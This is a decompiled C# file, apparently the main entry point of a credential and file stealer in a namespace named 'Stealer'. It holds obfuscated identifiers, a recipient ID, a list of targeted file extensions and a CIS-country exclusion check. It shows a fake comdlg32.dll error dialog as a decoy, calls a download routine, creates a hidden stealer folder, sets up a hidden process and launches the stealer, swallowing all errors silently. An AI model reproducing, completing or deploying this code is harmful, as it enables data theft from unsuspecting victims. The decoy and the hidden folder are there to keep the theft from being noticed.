using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Stealer;

internal class LhEWYGmwhOEoYt
{
	public static string send_to = "978729500";

	public static List<string> Extensions = new List<string> { ".txt" };

	public static string tag = "default";

	public static bool error = false;

	public static bool cis = false;

	public static bool none = true;

	public static string path = "32vf";

	public static readonly string[] sites = new string[0];

	public static List<string> cis_countries = new List<string>
	{
		"RU", "AM", "BY", "KZ", "KG", "TJ", "TM", "UZ", "MZ", "UA",
		"AZ"
	};

	[STAThread]
	private static void Main()
	{
		try
		{
			new Thread((ThreadStart)delegate
			{
				//IL_0014: Unknown result type (might be due to invalid IL or missing references)
				if (error)
				{
					MessageBox.Show("The module \"comdlg32.dll\" has been loaded, but the DllRegisterServer entry point was not found. \n\nCheck that \"comdlg32.dll\" is a valid DLL or OCX file, please try again.", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
			}).Start();
			if (!File.Exists(Path.GetTempPath() + "4SctCP2fF9dwus") && !Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\32vf") && (!cis || !cis_countries.Contains(cDFkBrvXKxXwYB.Code())))
			{
				cDFkBrvXKxXwYB.download();
				File.WriteAllText(Path.GetTempPath() + "4SctCP2fF9dwus", "");
				Thread.Sleep(0);
				Directory.CreateDirectory(Help.path_stealer).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				new Process
				{
					StartInfo = 
					{
						FileName = "ssssssssssss",
						CreateNoWindow = true,
						ErrorDialog = false,
						UseShellExecute = false,
						WindowStyle = ProcessWindowStyle.Hidden
					}
				};
				cDFkBrvXKxXwYB.Start();
			}
		}
		catch (Exception)
		{
		}
	}
}
